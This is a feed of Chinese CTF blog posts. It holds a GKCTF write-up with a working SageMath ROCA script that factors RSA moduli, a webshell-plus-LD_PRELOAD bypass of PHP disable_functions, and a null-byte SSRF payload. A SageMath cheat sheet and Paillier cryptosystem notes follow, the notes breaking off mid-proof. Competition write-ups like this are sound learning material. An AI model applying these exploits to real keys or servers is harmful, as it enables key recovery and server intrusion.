class="string">"M_prime"</span>: <span class="number">0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x400000000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_howgrave_univariate</span><span class="params">(pol, N, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith revisited by Howgrave-Graham</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * b|N, b &gt;= N^beta , 0 &lt; beta &lt;= 1</span></span><br><span class="line"><span class="string">    * |x| &lt; XX</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dd = pol.degree()</span><br><span class="line">    nn = dd * mm + tt</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># checks</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span> :</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"beta should belongs in (0, 1]"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pol.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">"Polynomial must be monic."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Coppersmith revisited algo for univariate</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change ring of pol and x</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute polynomials</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(dd):</span><br><span class="line">            gg.append((x * XX)**jj * N**(mm - ii) * polZ(x * XX)**ii)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(tt):</span><br><span class="line">        gg.append((x * XX)**ii * polZ(x * XX)**mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii+<span class="number">1</span>):</span><br><span class="line">            BB[ii, jj] = gg[ii][jj]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    BB = BB.LLL(early_red=<span class="literal">True</span>, use_siegel=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform shortest vector in polynomial</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        new_pol += x**ii * BB[<span class="number">0</span>, ii] / XX**ii</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor polynomial</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> potential_roots]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Top level of the attack, feeds the queue for the workers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">roca</span><span class="params">(N)</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Key is not always of perfect size, infer from size</span></span><br><span class="line">  keylength = int(log(N, <span class="number">2</span>))</span><br><span class="line">  <span class="keyword">if</span> keylength &lt; <span class="number">1000</span> :</span><br><span class="line">    keylength = <span class="number">512</span></span><br><span class="line">  <span class="keyword">elif</span>  keylength &lt; <span class="number">2000</span> :</span><br><span class="line">    keylength = <span class="number">1024</span></span><br><span class="line">  <span class="keyword">elif</span> keylength &lt; <span class="number">4000</span> :</span><br><span class="line">    keylength = <span class="number">2048</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    keylength = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># bruteforce</span></span><br><span class="line">  M_prime = param[keylength][<span class="string">'M_prime'</span>]</span><br><span class="line">  c_prime = discrete_log(N, Mod(<span class="number">65537</span>, M_prime))</span><br><span class="line">  ord_prime = Zmod(M_prime)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">  top = (c_prime + ord_prime)/<span class="number">2</span></span><br><span class="line">  beta = <span class="number">0.5</span></span><br><span class="line">  mm = param[keylength][<span class="string">'m'</span>]</span><br><span class="line">  tt = param[keylength][<span class="string">'t'</span>]</span><br><span class="line"></span><br><span class="line">  XX = int((<span class="number">2</span>*pow(N, beta)) / M_prime)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Bruteforce until p, q are found</span></span><br><span class="line">  a_prime = floor(c_prime/<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">while</span> a_prime &lt; top:</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Construct polynomial</span></span><br><span class="line">      m_inv = int(inverse_mod(M_prime, N))</span><br><span class="line">      k_tmp = int(pow(<span class="number">65537</span>, a_prime, M_prime))</span><br><span class="line">      known_part_pol = int(k_tmp * m_inv)</span><br><span class="line">      F = PolynomialRing(Zmod(N), implementation=<span class="string">'NTL'</span>, names=(<span class="string">'x'</span>,))</span><br><span class="line">      (x,) = F._first_ngens(<span class="number">1</span>)</span><br><span class="line">      pol = x + known_part_pol</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Get roots of polynomial using coppersmith</span></span><br><span class="line">      roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Check if roots are p, q</span></span><br><span class="line">      <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        factor1 = k_tmp + abs(root) * M_prime</span><br><span class="line">        <span class="keyword">if</span> mod(N, factor1) == <span class="number">0</span>:</span><br><span class="line">          factor2 = N // factor1</span><br><span class="line">          <span class="keyword">return</span> int(factor1), int(factor2)</span><br><span class="line">      a_prime += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Roca</span></span><br><span class="line">p = <span class="number">135879036921529661794648581653002330298301044224526679653380767028908108252308273197382392628515754461497140112085352276569074111872088188367336757057332590938346879044292991775026289443754785127606230777989486075849384095736865778026395017314284500188674246388734465652666728075877428904646726042443084490733</span></span><br><span class="line">q = <span class="number">136030166899916836494910593158841550636266310029556929683174827580476574762487106877006810987126725903225945843864212303796002840361299997548544768590518964089753416844749381816714973552330950849352052797513575852750175731227705787558580111648617297716840633123746097117675990517245812564173658065172087693179</span></span><br><span class="line"><span class="comment">#N = p*q</span></span><br><span class="line">N=<span class="number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] Factoring %i"</span> % N)</span><br><span class="line"></span><br><span class="line">factor1, factor2 = roca(N)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] Found factors of N:"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] p ="</span> , factor1)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"[+] q ="</span> , factor2)</span><br></pre></td></tr></table></figure><p>分解n了，这一题结束了。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>进bilibili直播间复制</p><h2 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a>Pokémon</h2><p>走到103，flag画在地板上了</p><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>pass</p><h2 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a>code obfuscation</h2><p>首先用ps调好</p><p><img src="https://i.loli.net/2020/05/24/2JyUPlwhucNpIqf.png" alt></p><p>然后因为这些空隙，直接扫可能是扫不出来的，这边推荐用支付宝扫码，然后扫的时候抖动你的手机，让画面模糊，把空隙给抖没了就能扫出来base(gkctf)</p><p>然后这张图下面有一个rar，经过测试密码是base58(gkctf)，解密后是给了一串js代码，网站js解密后地得到</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="keyword">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="keyword">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="keyword">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span><span class="string">';Bn='</span>#<span class="string">';Bs='</span> (<span class="string">';Bt='</span>)<span class="string">';By='</span>.<span class="string">';Cb='</span>;<span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span>_<span class="string">';Cn='</span>&#123;<span class="string">';Cp='</span>&#125;<span class="string">';Da='</span><span class="number">0</span> <span class="string">';Db='</span><span class="number">1</span> <span class="string">';Dc='</span><span class="number">2</span> <span class="string">';Dd='</span><span class="number">3</span> <span class="string">';De='</span><span class="number">4</span> <span class="string">';Df=5 '</span>;Dg=<span class="string">'6 '</span>;Dh=<span class="string">'7 '</span>;Di=<span class="string">'8 '</span>;Dj=<span class="string">'9 '</span>;<span class="string">")</span></span><br></pre></td></tr></table></figure><p>字符替换，结合<img src="https://i.loli.net/2020/05/24/ZoXt8ODkK2bvqIy.png" alt></p><p>得到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">print(<span class="string">"w3lc0me_4o_9kct5"</span>);</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h2><p>首先用AU把音频切掉，得到最后的电话音，然后用dtmf2num得到那一串数字</p><p>然后9键键盘加密得到ctfisfun，再用hint给的工具解密哈丽奎因那张图，得到flag.txt</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Check-1n"><a href="#Check-1n" class="headerlink" title="Check_1n"></a>Check_1n</h2><p>ida打开，搜索解密失败找到密码HelloWorld，然后开机，flag里头说让玩大砖块（真难），不过死了直接给flag，（还好）</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>直接传一句话(base64encode)，蚁剑连上，然后功能被禁用完了，</p><p>putenv还在，</p><p>直接LD_PRELOAD绕disablie_fuc</p><p>system没法输出flag，改一改hack.c，直接重定向到文件里就好了。</p><p>最后再在一句话那里include一下我们的hack.php就好</p><h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><p>安恒月赛也有，get_header 的trick，直接日内网，<code>url=http://127.0.0.1%00.ctfhub.com</code></p><p>tips说host以123结尾</p><p>payload:<code>url=http://127.0.0.123%00.ctfhub.com</code></p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sage常用命令</title>
      <link href="/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>这里会记录一点点sage比较好用的命令，简易手册<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/20/sage常用命令/sagemath.pdf" target="_blank" rel="noopener">原文件</a>丢这里了，平时再遇到一些好用的命令应该还会更新。</p><h2 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h2><p>将整数转化为二进制列表</p><p>sage: 10.bits()</p><h2 id="基本代数"><a href="#基本代数" class="headerlink" title="基本代数"></a>基本代数</h2><p><strong>解方程</strong></p><p>solve 函数用于解方程。要使用它，先要<strong>指定变量</strong>，然后将<strong>方程（或方程组）</strong>以及<strong>要求解的变量</strong>作为参数 传给 solve。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: var('x y p q')</span><br><span class="line"><span class="attribute">sage</span>: eq1 = p+q==9 </span><br><span class="line"><span class="attribute">sage</span>: eq2 = q*y+p*x==-6 </span><br><span class="line"><span class="attribute">sage</span>: eq3 = q*yˆ2+p*xˆ2==24 </span><br><span class="line"><span class="attribute">sage</span>: solve([eq1,eq2,eq3,p==1],p,q,x,y) </span><br><span class="line"></span><br><span class="line">[[p == 1, q == 8, x == -4/3*sqrt(10) - 2/3, y == 1/6*sqrt(2)*sqrt(5) - 2/3], [p == 1, q == 8, x == 4/3*sqrt(10) - 2/3, y == -1/6*sqrt(2)*sqrt(5) - 2/3]]</span><br><span class="line"></span><br><span class="line">要求解的近似值，可以这样：</span><br><span class="line"><span class="attribute">sage</span>: solns = solve([eq1,eq2,eq3,p==1],p,q,x,y, solution dict=True) </span><br><span class="line"><span class="attribute">sage</span>: [[s[p].n(30), s[q].n(30), s[x].n(30), s[y].n(30)] for s in solns] </span><br><span class="line"></span><br><span class="line">[[1.0000000, 8.0000000, -4.8830369, -0.13962039], [1.0000000, 8.0000000, 3.5497035, -1.1937129]]</span><br></pre></td></tr></table></figure><p><strong>求解方程的数值解</strong></p><p>用 find root 在区间 0 &lt; ϕ &lt; π/2 上寻找上述方程的解。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">phi</span> = <span class="built_in">var</span>('<span class="built_in">phi</span>') </span><br><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">find</span> root(<span class="built_in">cos</span>(<span class="built_in">phi</span>)==<span class="built_in">sin</span>(<span class="built_in">phi</span>),<span class="number">0</span>,<span class="built_in">pi</span>/<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line"><span class="number">0.785398163397448</span>..</span><br></pre></td></tr></table></figure><h2 id="基本的环"><a href="#基本的环" class="headerlink" title="基本的环"></a>基本的环</h2><p>• 整数环 {…,−1,0,1,2,…}, Sage 中叫 ZZ; </p><p>• 有理数环 ，即整数构成的分数，Sage 中叫 QQ; </p><p>• 实数环，Sage 中叫 RR;</p><p>• 复数环，Sage 中叫 CC；</p><p>sage: ratpoly.&lt;t&gt; = PolynomialRing(QQ) </p><p>ratpoly是集合的名字，自己定义</p><p>.&lt;t&gt;是变量的名字，自己定义</p><p>PolynomialRing()是环</p><p>QQ是有理数环</p><p>有限域还有，GF(2)、GF(2^8,modulus=[1,0,0,1,1,1,0,0,1]) ……</p><h2 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h2><p>使用方法 solve right. 执行 A.solve right(Y) 返回一个矩阵（或向量）X 满 足 AX = Y:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) </span><br><span class="line"><span class="attribute">sage</span>: Y = vector([0, -4, -1]) </span><br><span class="line"><span class="attribute">sage</span>: X = A.solve_right(Y) </span><br><span class="line"></span><br><span class="line">反斜杠 \ 可以代替 solve_right; 用 A \ Y 代替 A.solve right(Y).</span><br><span class="line"><span class="attribute">sage</span>: A \ Y</span><br></pre></td></tr></table></figure><p>类似的，使用 A.solve left(Y) 求解满足 XA = Y 的 X. </p><p>矩阵所在的环影响它的性质。</p><p>matrix 命令中的第一个参数告诉 Sage 这个矩阵 是整数环 (ZZ) 上的，有理数环 (QQ) 上的，还是实数环 (RR) 上的:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sage: AZ = matrix(ZZ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AQ = matrix(QQ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AR = matrix(RR, <span class="string">[[2,0], [0,1]]</span>)</span><br></pre></td></tr></table></figure><p>新建一个3*3的矩阵A</p><p>sage: A = Matrix(3,range(9))     </p><p>A的阶梯形式</p><p>sage: A.echelon form() </p><p>A的转置矩阵</p><p>sage: A.T == A.transpose()</p><p>A的行向量</p><p>sage: A.rows()</p><p>A的列向量</p><p>sage: A.columns()</p><h2 id="多项式"><a href="#多项式" class="headerlink" title="多项式"></a>多项式</h2><h3 id="一元多项式"><a href="#一元多项式" class="headerlink" title="一元多项式"></a>一元多项式</h3><p>三种方式创建多项式环</p><p>sage: R = PolynomialRing(QQ, ‘t’) </p><p>sage: R = QQ[‘t’] </p><p>sage: R.&lt;t&gt; = PolynomialRing(QQ)     or     sage: R.&lt;t&gt; = QQ[‘t’]    or     R.&lt;t&gt; = QQ[] </p><p>eg:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> R.&lt;<span class="built_in">t</span>&gt; = QQ[]</span><br><span class="line">sa<span class="symbol">ge:</span> f = <span class="number">2</span>*<span class="built_in">t</span>^<span class="number">7</span> +<span class="number">3</span>*<span class="built_in">t</span>^<span class="number">2</span> -<span class="number">15</span>/<span class="number">19</span></span><br><span class="line">sa<span class="symbol">ge:</span> f^<span class="number">2</span></span><br><span class="line"><span class="number">4</span>*<span class="built_in">t</span>^<span class="number">14</span> + <span class="number">12</span>*<span class="built_in">t</span>^<span class="number">9</span> - <span class="number">60</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">7</span> + <span class="number">9</span>*<span class="built_in">t</span>^<span class="number">4</span> - <span class="number">90</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">2</span> + <span class="number">225</span>/<span class="number">361</span></span><br></pre></td></tr></table></figure><p>生成随机多项式</p><p>sage: R.&lt;y&gt; = PolynomialRing(GF(p))</p><p>sage: S = R.random_element(degree)</p><p>多项式的系数</p><p>sage: S.coefficients()</p><p>检测多项式是否不可约：</p><p>sage: S.is_irreducible()</p><p>(把多项式每一项的模数由p转变为S对应项的系数)</p><p>sage: RS = R.quotient(S)</p><p>将整数列表转为多项式对应项的系数（阶递增）</p><p>sage: R([111,222])<br>222*y + 111</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>^<span class="number">8</span>,modulus=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) #感觉那个PolymonialRing都不用写了</span><br><span class="line">F.fetch_int(<span class="number">21</span>) == F(<span class="number">21.</span>bits())</span><br><span class="line">F(<span class="number">21.</span>bits()).integer_representation()#逆过程</span><br></pre></td></tr></table></figure><h3 id="多元多项式"><a href="#多元多项式" class="headerlink" title="多元多项式"></a>多元多项式</h3><p>跟定义一元多项式一样，定义多元多项式也有多种方法：</p><p>sage: GF(5)[‘z0, z1, z2’] </p><p>sage: R.&lt;z0,z1,z2&gt; = GF(5)[];</p><p>sage: PolynomialRing(GF(5), 3, ‘xyz’)</p><p>eg:</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">sage: R.<span class="tag">&lt;<span class="name">x,y</span>&gt;</span> = RationalField()[]</span></span><br><span class="line"><span class="xml">sage: f = (x</span><span class="keyword">^3</span><span class="xml"> +</span><span class="number">2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml">*x)</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: g = x</span><span class="keyword">^2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: f.gcd(g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: gcd(f,g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="数论"><a href="#数论" class="headerlink" title="数论"></a>数论</h2><p>sage: R = IntegerModRing(97)     or     R = Zmod(97)        #定义模数为97的环</p><p>sage: a = R(2) / R(3)         #环上的除法</p><p>sage: a.is_square()        #是否为二次剩余</p><p>sage: gcd(3,2)        #最大公因数</p><p>sage: factorial(5)        #阶乘</p><p>sage: next_prime()        #后一个素数</p><p>sage: previous_prime()        #前一个素数</p><p>sage: divisors()     #所有因子</p><p>sage: sigma(n,k)    #n的所有因子的k次幂之和</p><p>sage: inverse_mod(a,n)    #求逆</p><p>两种因式分解</p><p>sage: factor(1024)        -&gt;    2^10<br>sage: prime_divisors(1024)        -&gt;    [2]</p><p>有限域下开根</p><p>sage: R.&lt;X&gt; = PolynomialRing(Zmod(p))</p><p>sage: f = x^256 - c</p><p>sage: f.monic().roots()</p><p>sage: euler_phi(n)        #求n的欧拉函数        sage: phi = n*prod([1 - 1/p for p in prime divisors(n)]); </p><p>sage: crt(m1,m2,n1,n2)        #中国剩余定理 【x % n1 = m1; x % n2 = m3】</p><h2 id="Elliptic-Curves"><a href="#Elliptic-Curves" class="headerlink" title="Elliptic Curves"></a>Elliptic Curves</h2><p> EllipticCurve(R, [a1, a2, a3, a4, a6]) eg:</p><p>sage: ecc = EllipticCurve(GF(q), [a,b])        #初始化一条线</p><p>sage: G = ecc(x,y)        #选定其上的一个点</p><p>sage: G.order()        #G点的阶</p>]]></content>
      
      
      <categories>
          
          <category> 工具小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 paillier cryptosystem</title>
      <link href="/2020/05/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bpaillier%20cryptosystem/"/>
      <url>/2020/05/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bpaillier%20cryptosystem/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/204720" target="_blank" rel="noopener">安全客</a></p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>&emsp;&emsp;现代公钥密码系统中，其实远远不止RSA、DSA、ECC等众所周知的公钥密码系统，最近还学习到了一种比较年轻的公钥密码系统 —— <strong>paillier cryptosystem</strong> 但是wiki上并没有给出该方案的解密的proof。</p><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><p>&emsp;&emsp;Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质 ; 这意味着，仅给出公钥和m1、m2加密，可以计算出m1 + m2</p><h2 id="Key-generation"><a href="#Key-generation" class="headerlink" title="Key generation"></a>Key generation</h2><h3 id="The-frist-pattern："><a href="#The-frist-pattern：" class="headerlink" title="The frist pattern："></a>The frist pattern：</h3><ol><li>随机选择两个大质数p、q满足$gcd(pq, (p-1)\cdot (q-1))$。</li><li>计算$n=p\cdot q，λ = lcm(p-1, q-1) = \frac{(p-1)\cdot (q-1) }{ gcd(p-1,q-1)}$</li><li>选择随机整数g，$0&lt;g&lt;n^2$</li><li>定义$L(x) = \frac{(x-1)} { n}$</li><li>计算$μ = (L(g^λ \pmod {n^2} ))^{-1} \pmod n$</li><li>公钥为$(n，g)$</li><li>私钥为$(λ，μ)$</li></ol><h3 id="The-second-pattern（a-simpler-variant）："><a href="#The-second-pattern（a-simpler-variant）：" class="headerlink" title="The second pattern（a simpler variant）："></a>The second pattern（a simpler variant）：</h3><p>其余参数不变，主要改变了g，λ，μ的定义</p><ol><li>$g = n+1$</li><li>$λ = φ(n) = (p-1)\cdot (q-1) $</li><li>$μ = φ(n)^{-1} \pmod n$</li></ol><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><ol><li>设$m$为要加密的消息，显然需要满足，$0 ≤ m ＜ n$</li><li>选择随机 $r$，保证$gcd(r, n) = 1$</li><li>密文$c$：$c = g^m\cdot r^n \pmod {n^2}$</li></ol><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><ol><li>$m = ( L( c^λ \pmod {n^2} ) \cdot μ ) \pmod n$</li></ol><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>以下推理过程就用数学公式记录了，如果平台显示不出来的话，建议复制进typora等此类编辑器中食用，下面也会给出截图</p><h4 id="The-first-pattern"><a href="#The-first-pattern" class="headerlink" title="The first pattern"></a>The first pattern</h4><p>由 $L(c^λ \pmod{n^2}\cdot μ) \pmod{n}$</p><p>有 $L(g^{mλ}\cdot r^{nλ}\pmod{n^2})\cdot μ \pmod{n}$  ①</p><p>其中$λ = \frac{(p-1) \cdot (q-1)}{gcd((p-1)\cdot (q-1))}, μ = L(g^λ \pmod{n^2})^{-1} \pmod{n}$</p><p>所以①式=&gt;  $L(g^{mλ}\cdot r^{nλ} \pmod{n^2})\cdot L(g^λ \pmod{n^2})^{-1} \pmod{n}$ ②</p><p>∵$(p-1)|λ, (q-1)|λ$</p><p>∴$λ = k_1(p-1) = k_2(q-1)$</p><p>∴$g^λ = g^{k_1(p-1)}\equiv 1 \pmod{p}，即 (g^λ -1) | p$</p><p>$ g^λ = g^{k_2(q-1)}\equiv 1 \pmod{q}， 即 (g^λ -1) | q$</p><p>∴$  (g^λ -1) | lcm(p,q) ，即 (g^λ -1) | pq，即g^λ \equiv 1 \pmod{n} $</p><p>∴$g^λ \pmod{n^2} \equiv 1\pmod{n}$</p><p>∴$g^λ\pmod{n^2} = k_gn+1; k&lt;n$  </p><p>∴$L(g^λ\pmod{n^2}) = k_g$</p><p>且有</p><ol><li><p>$1+kn \equiv 1+kn \pmod{m^2}$</p></li><li><p>$(1+kn)^2 \equiv 1+2kn+(kn)^2 \equiv 1+2kn \pmod{m^2}$</p></li><li><p>$(1+kn)^3  \equiv 1+3(kn)^2+3kn+(kn)^3 \equiv 1+3kn \pmod{m^2}$</p><p>这里我们就不用数学分析法了，就直接易得了</p><p>=&gt; $(1+kn)^{m} \equiv knm+1 \pmod{n^2}$</p></li></ol><p>∴$g^{mλ} = (1+k_gn)^{m} \equiv k_gnm+1 \pmod{n^2}$</p><p>∴$r^{nλ} = (1+k_nn)^{n} \equiv k_nn^2+1 \equiv 1\pmod{n^2}$</p><p>∴$L(g^{mλ}\cdot r^{nλ}\pmod{n^2}) = L(k_gnm+1)=mk_g$</p><p>又∴$L(g^λ\pmod{n^2}) = k_g$</p><p>∴②式： 